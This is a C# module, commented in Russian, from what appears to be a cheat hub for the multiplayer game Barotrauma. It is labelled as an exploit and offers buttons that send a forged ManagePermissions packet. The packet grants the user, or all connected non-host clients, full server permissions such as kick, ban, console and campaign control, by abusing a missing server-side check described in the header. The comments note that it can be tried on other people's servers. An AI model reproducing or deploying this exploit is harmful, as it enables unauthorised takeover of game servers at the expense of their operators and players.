// ============================================================================
//  PermEscalationTest.cs — тест ManagePermissions (волна 693)
//
//  ТЕСТ РАБОТЫManagePermissions БЕЗ ПЕРМА.
//  Серверная ветка (GameServer.cs:1960):
//    case ClientPermissions.ManagePermissions:
//        byte targetClientID = inc.ReadByte();
//        Client targetClient = connectedClients.Find(c => c.SessionId == targetClientID);
//        if (targetClient == null || targetClient == sender ||
//            targetClient.Connection == OwnerConnection) { return; }
//        targetClient.ReadPermissions(inc);
//        ...
//    На входе НЕТ HasPermission! Ровно как в 692. Но GameServer может
//    где-то внутри валидировать (SetPermissions серверной версии —
//    я смотрел: она просто Permissions = permissions; БЕЗ проверок!).
//
//  СТРАХОВКА: тестируй на СВОЁМ локальном сервере сначала. На чужом —
//  только в хард-тест. Если сервер логает/кикает — рядом будет сообщение.
//
//  КНОПКИ:
//   SELF ALL — выдать себе все пермы (target = свой SessionId)
//   ALL CLIENTS — раздать пермы ВСЕМ подключённым (кроме хоста)
//   STRIP HOST... — нельзя, host гвардится. Кнопки нет.
//
//  ФОРМАТ ПАКЕТА (по ReadPermissions на сервере):
//    byte  ManagePermissions
//    byte  targetClientID (SessionId цели)
//    ranged(0, All) permission bits (int32)
//    если флаг ConsoleCommands: u16 commandCount + Identifier commandName × count
// ============================================================================

using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class PermEscalationTest : CSModuleBase
    {
        public override string Id   => "perm_escalation_test";
        public override string Name => "Perm Escalation Test";
        public override string Description =>
            "ManagePermissions без входного перм-чека (GameServer.cs:1960) — тест выдачи пермов.\n" +
            "Гварды только: target != self, target != host. Проверка SetPermissions сервера — пустая.\n" +
            "Если сработает — у тебя All-пермы (kick/ban/console/campaign).";
        public override string Category => "exploit";

        public override string GetLabel() => "Perm Escalation 🎖";

        public override void OnClick()
        {
            if (GameMain.Client == null)
            {
                GUI.AddMessage("PermEsc: только клиент MP", new Color(255, 100, 100));
                return;
            }
            if (GameMain.GameSession?.GameMode is not MultiPlayerCampaign)
            {
                GUI.AddMessage("PermEsc: тест работает на кампейн-серверах (для ветки round/campaign тоже можешь пробовать)", new Color(255, 200, 100));
                // не выходим: ветка ManagePermissions в GameServer — не кампейн-специфична
            }

            var window = new GUIMessageBox(
                "🎖 PERM ESCALATION TEST",
                "Отправка ManagePermissions пакета с target=self (SessionId " +
                GameMain.Client.SessionId + ") и permissions=All.\n\n" +
                "Если сервер примет — ты получишь: Kick, Ban, Unban, ManageRound,\n" +
                "ManageCampaign, ConsoleCommands, ManageMap, ManageMoney, ManageSettings,\n" +
                "ManagePermissions, SelectMode, SellInventoryItems, SellSubItems, ManageHires...\n\n" +
                "После применения: консоль (F5 или через DebugConsole), конец раунда, сейв.",
                new LocalizedString[]
                {
                    "SELF ALL-PERMS",
                    "ALL CLIENTS ALL-PERMS",
                    "Close",
                },
                new Vector2(0.65f, 0.6f));

            window.Buttons[0].Color = Color.LimeGreen;
            window.Buttons[1].Color = Color.Orange;
            window.Buttons[2].Color = Color.DarkGray;

            window.Buttons[0].OnClicked = (_, _) =>
            {
                SendAllPerms(GameMain.Client.SessionId);
                return true;
            };

            window.Buttons[1].OnClicked = (_, _) =>
            {
                int sent = 0;
                foreach (var c in GameMain.Client.ConnectedClients)
                {
                    if (c == null) { continue; }
                    // хост на клиенте виден как IsOwner (Client.IsOwner, client-side field)
                    try { if (c.IsOwner) { continue; } } catch { }
                    SendAllPerms(c.SessionId);
                    sent++;
                }
                GUI.AddMessage($"PermEsc: отправлено на {sent} клиентов (host исключён)", Color.Orange);
                return true;
            };

            window.Buttons[2].OnClicked = (_, _) => { window.Close(); return true; };
        }

        private static void SendAllPerms(byte targetSessionId)
        {
            try
            {
                var msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.SERVER_COMMAND);
                msg.WriteUInt16((ushort)ClientPermissions.ManagePermissions);

                msg.WriteByte(targetSessionId);

                // permissions = ClientPermissions.All (ranged int 0..All)
                int all = (int)ClientPermissions.All;
                msg.WriteRangedInteger(all, 0, (int)ClientPermissions.All);

                // если флаг ConsoleCommands — сервер ждёт commandCount+identifiers.
                // All включает ConsoleCommands => шлём 0 команд (пустой список допустим:
                // сервер просто не добавит ни одной PermittedConsoleCommand).
                msg.WriteUInt16(0);

                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);

                DebugConsole.NewMessage(
                    $"[PermEsc] пакет отправлен: target={targetSessionId}, perms={all} (All)",
                    Color.Lime);
                GUI.AddMessage("PermEsc: пакет ушёл. Проверь: выданы ли пермы — " +
                               "если да, консоль/меню управления появятся сразу.",
                    Color.LimeGreen);
            }
            catch (Exception e)
            {
                LuaCsLogger.LogError("[PermEsc] send fail: " + e.Message);
                GUI.AddMessage("PermEsc: " + e.Message, Color.Red);
            }
        }
    }
}
